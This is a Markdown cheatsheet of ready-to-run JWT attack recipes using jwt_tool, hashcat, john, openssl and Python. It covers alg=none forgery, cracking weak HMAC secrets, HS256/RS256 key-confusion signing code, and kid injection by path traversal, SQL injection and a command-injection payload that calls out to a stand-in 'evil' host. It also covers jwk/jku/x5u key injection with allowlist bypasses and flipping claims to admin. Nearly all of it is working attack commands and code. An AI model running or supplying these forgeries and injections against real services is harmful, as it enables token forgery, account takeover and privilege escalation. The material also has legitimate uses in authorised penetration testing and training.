---
title: "JWT Attacks - jwt_tool, hashcat and openssl Recipes"
category: web
subcategory: tokens
type: cheatsheet
tags: [jwt, jwt-tool, hashcat, openssl, alg-none, key-confusion, hs256, rs256, weak-secret, jku, jwk, kid, x5u, jwe, hmac, brute-force, forge]
summary: "Exact jwt_tool / python / hashcat -m 16500 / openssl commands for every JWT attack: alg=none, HS/RS confusion, weak-secret brute, jku/jwk/kid/x5u injection."
tools: [jwt-tool, hashcat, john, openssl, python3]
related: [jwt-attacks-full, jwt-toolkit, java-oauth-saml-flaws]
---

## Decode / inspect

```sh
# jwt_tool: decode, show claims, list applicable attacks
python3 jwt_tool.py <token>
python3 jwt_tool.py <token> -T                 # tamper interactively

# manual decode (bash)
echo -n '<header>' | tr '_-' '/+' | base64 -d 2>/dev/null; echo
echo -n '<payload>' | tr '_-' '/+' | base64 -d 2>/dev/null; echo

# python one-liner
python3 -c "import base64,sys;print(base64.urlsafe_b64decode(sys.argv[1]+'=='*3))" '<part>'
```

## alg=none

```sh
# jwt_tool exploit mode: -X a  = alg:none (all case variants)
python3 jwt_tool.py <token> -X a

# manual: header {"alg":"none"} + empty signature (trailing dot)
printf '%s' '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr '/+' '_-' | tr -d '='
# variants that dodge alg=="none" checks:
#   "none" "None" "NONE" "nOnE" "none " ["none"]  and empty alg ""
```

## Weak HMAC secret brute force

```sh
# hashcat mode 16500 = JWT (HMAC-SHA256/384/512)
hashcat -m 16500 token.txt /usr/share/wordlists/rockyou.txt
hashcat -m 16500 token.txt -a 3 ?a?a?a?a?a?a          # mask, 6 printable
hashcat -m 16500 token.txt rockyou.txt -r best64.rule # rules

# jwt_tool dictionary crack
python3 jwt_tool.py <token> -C -d /usr/share/wordlists/rockyou.txt

# john (via jwt2john or the raw HMAC format)
john --wordlist=rockyou.txt --format=HMAC-SHA256 hash.txt

# re-sign once you have the secret:
python3 jwt_tool.py <token> -S hs256 -p '<secret>'
```

## HS256 / RS256 key confusion

```sh
# 1. obtain the RSA public key the server verifies RS256 with:
#    from JWKS:
curl -s https://target/.well-known/jwks.json
#    from a certificate:
openssl x509 -in server.crt -pubkey -noout > pub.pem
#    from a live TLS endpoint (NOT the JWT key, but sometimes reused):
openssl s_client -connect target:443 </dev/null 2>/dev/null | openssl x509 -pubkey -noout > pub.pem
#    recover n from TWO RS256 tokens when the key is not published:
python3 jwt_forgery.py <token1> <token2>          # rsa_sign2n -> n.pem / pub.pem

# 2. sign a forged HS256 token using pub.pem AS THE HMAC SECRET:
python3 jwt_tool.py <token> -X k -pk pub.pem
#    manual (python):
python3 - <<'PY'
import hmac,hashlib,base64,json
def b(x): return base64.urlsafe_b64encode(x).rstrip(b'=').decode()
pub=open('pub.pem','rb').read()
h=b(json.dumps({"alg":"HS256","typ":"JWT"},separators=(',',':')).encode())
p=b(json.dumps({"sub":"admin","role":"admin"},separators=(',',':')).encode())
s=b(hmac.new(pub, f"{h}.{p}".encode(), hashlib.sha256).digest())
print(f"{h}.{p}.{s}")
PY

# try each byte-form of the key -- trailing newline is the usual gotcha:
#   pub.pem as-is | pub.pem without trailing \n | + trailing \n | CRLF->LF
```

## kid injection

```sh
# path traversal to an empty/known-content key
{"alg":"HS256","kid":"../../../../../../dev/null"}      # key = "" -> sign with empty secret
{"alg":"HS256","kid":"/proc/sys/kernel/randomize_va_space"}   # predictable content
# sign with empty secret:
python3 jwt_tool.py <token> -S hs256 -p '' -I -hc kid -hv '../../../../dev/null'

# SQL injection in kid -> control the returned key
{"kid":"nonexistent' UNION SELECT 'attackerkey'-- -"}
python3 jwt_tool.py <token> -S hs256 -p 'attackerkey' -I -hc kid \
  -hv "x' UNION SELECT 'attackerkey'-- -"

# command injection in kid
{"kid":"x|curl http://evil/`id`"}
```

## jwk (embedded key) injection

```sh
# put YOUR public key in the header; broken verifiers trust it
python3 jwt_tool.py <token> -X i                 # jwt_tool auto-generates + embeds a jwk
# manual: header carries jwk={kty,n,e,kid}; sign with the matching private key
```

## jku / x5u (remote key set) injection

```sh
# point jku at a JWKS you host; serve your public key there
python3 jwt_tool.py <token> -X s -ju https://evil/jwks.json
# host the JWKS:
#   {"keys":[{"kty":"RSA","kid":"attacker","use":"sig","n":"<b64url n>","e":"AQAB"}]}
# allowlist bypasses for the jku host:
#   https://trusted@evil/           (userinfo)
#   https://trusted.evil/           (prefix)
#   https://evil/#trusted           (fragment)
#   https://evil/..;/trusted        (path confusion)
#   SSRF to a trusted endpoint that reflects your JWKS
# x5u: same, but host an X.509 cert; x5c embeds a self-signed chain in the header
```

## Generate a keypair + JWKS for jku/jwk/x5u

```sh
openssl genrsa -out priv.pem 2048
openssl rsa -in priv.pem -pubout -out pub.pem
# n and e as base64url for the JWK:
python3 - <<'PY'
from cryptography.hazmat.primitives.serialization import load_pem_public_key
import base64
k=load_pem_public_key(open('pub.pem','rb').read()).public_numbers()
def b(i): 
    x=i.to_bytes((i.bit_length()+7)//8,'big'); 
    return base64.urlsafe_b64encode(x).rstrip(b'=').decode()
print('{"keys":[{"kty":"RSA","kid":"attacker","use":"sig","alg":"RS256","n":"%s","e":"%s"}]}'%(b(k.n),b(k.e)))
PY
```

## Claim tampering quick refs

```sh
python3 jwt_tool.py <token> -T                   # interactive claim editor
# common privilege claims to flip:
#   "role":"admin"  "isAdmin":true  "sub":"1"  "user":"admin"  "scope":"admin"
#   "aud" / "iss" confusion, drop/extend "exp", null "nbf"
```

## JWE (5 parts) notes

```
# 5 dot-separated parts = JWE (encrypted), NOT JWS -- different attacks:
#   header.encrypted_key.iv.ciphertext.tag
# - alg confusion between key-management algs
# - RSA1_5 (PKCS#1 v1.5) Bleichenbacher padding oracle on encrypted_key
# - "dir" with a guessable/leaked CEK
# - invalid-curve attack on ECDH-ES ("epk")
# - zip:"DEF" decompression bomb
```

## One-shot triage checklist

```
[ ] decode header -> note alg, kid, jku, jwk, x5u
[ ] alg=none + case/array variants
[ ] HS256? -> hashcat -m 16500
[ ] RS256 + public key obtainable? -> HS/RS confusion (try every byte-form)
[ ] kid present? -> traversal / SQLi / empty-key
[ ] jwk present? -> embed own key
[ ] jku/x5u present? -> host own JWKS/cert (mind allowlist bypass)
[ ] exp valid? set far future
[ ] 5 parts? -> JWE surface, not JWS
```

## References

- ticarpi/jwt_tool -- documentation and exploit modes.
- hashcat -- mode 16500 (JWT).
- RFC 7515/7516/7517/7519.
